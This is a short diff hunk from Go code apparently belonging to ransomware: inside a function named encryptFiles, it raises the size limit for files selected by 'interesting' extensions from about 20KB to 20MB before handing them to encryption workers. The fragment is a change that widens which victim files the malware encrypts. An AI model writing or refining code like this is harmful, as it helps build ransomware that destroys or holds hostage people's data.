@@ -123,7 +123,7 @@ func encryptFiles() {
 				ext := filepath.Ext(path)
 
 				// If the file is not a folder and have a size lower than 20MB
-				if ext != "" && f.Size() < (20*1024) {
+				if ext != "" && f.Size() < (20*1e+6) {
 					// Matching extensions
 					if utils.StringInSlice(strings.ToLower(ext[1:]), cmd.InterestingExtensions) {
 						// Each file is processed by a free worker on the pool
